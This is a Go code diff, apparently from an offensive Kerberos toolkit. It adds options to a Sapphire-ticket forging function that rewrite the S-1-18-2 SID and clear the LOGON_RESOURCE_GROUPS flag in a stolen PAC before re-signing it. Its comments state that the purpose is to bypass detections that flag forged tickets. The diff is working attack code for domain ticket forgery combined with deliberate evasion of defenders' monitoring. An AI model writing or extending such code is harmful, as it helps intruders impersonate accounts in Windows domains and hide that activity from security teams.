@@ -177,6 +177,17 @@ type SapphireTicketRequest struct {
 
 	// Connection
 	KDC string
+
+	// StripWatermark rewrites S-1-18-2 → S-1-18-1 in the stolen PAC's ExtraSids
+	// before re-signing. The S-1-18-2 SID is added by the KDC to S4U2Self tickets
+	// as a watermark and is structurally impossible for a KDC-issued TGT. Stripping
+	// it may bypass PAC-content-based sapphire detection.
+	StripWatermark bool
+
+	// StripLogonFlags clears the LOGON_RESOURCE_GROUPS (0x200) bit from
+	// KERB_VALIDATION_INFO.UserFlags before re-signing. This is a second S4U2Self
+	// watermark in the PAC, separate from S-1-18-2.
+	StripLogonFlags bool
 }
 
 // SapphireTicketResult contains the Sapphire Ticket.
@@ -427,6 +438,38 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		stolenPAC, err = pac.AddKB5008380Buffers(stolenPAC, userSID)
 		if err != nil {
 			fmt.Printf("[!] Warning: failed to add KB5008380 buffers: %v\n", err)
+		}
+	}
+
+	// Step 3.75: Optionally strip the S-1-18-2 watermark from the stolen PAC.
+	// S-1-18-2 (SERVICE_ASSERTED_IDENTITY) is the KDC's watermark for S4U2Self
+	// tickets. A TGT carrying it is structurally impossible from a legitimate AS-REQ,
+	// so it can be used by detections to identify sapphire tickets regardless of
+	// tool-specific wire fingerprints. Rewriting to S-1-18-1 makes the PAC look
+	// like it came from a normal AS authentication.
+	if req.StripWatermark {
+		fmt.Println("[*] Step 3.75: Stripping S-1-18-2 watermark (rewriting to S-1-18-1)...")
+		var n int
+		stolenPAC, n = pac.RewriteServiceAssertedIdentity(stolenPAC)
+		if n > 0 {
+			fmt.Printf("[+] Rewrote %d S-1-18-2 → S-1-18-1\n", n)
+		} else {
+			fmt.Println("[!] No S-1-18-2 found to rewrite (PAC may not carry the watermark)")
+		}
+	}
+
+	// Step 3.76: Optionally clear LOGON_RESOURCE_GROUPS bit in UserFlags.
+	// This is a second S4U2Self watermark in the PAC — the KDC sets this bit on
+	// S4U2Self responses, and a legit AS-REQ TGT never has it. Clearing it makes
+	// the PAC's UserFlags look like a normal AS result.
+	if req.StripLogonFlags {
+		fmt.Println("[*] Step 3.76: Clearing LOGON_RESOURCE_GROUPS bit from UserFlags...")
+		var n int
+		stolenPAC, n = pac.StripLogonResourceGroupsFlag(stolenPAC)
+		if n > 0 {
+			fmt.Printf("[+] Cleared LOGON_RESOURCE_GROUPS in %d UserFlags field(s)\n", n)
+		} else {
+			fmt.Println("[!] No UserFlags=0x220 pattern found (PAC may not carry this watermark)")
 		}
 	}
 
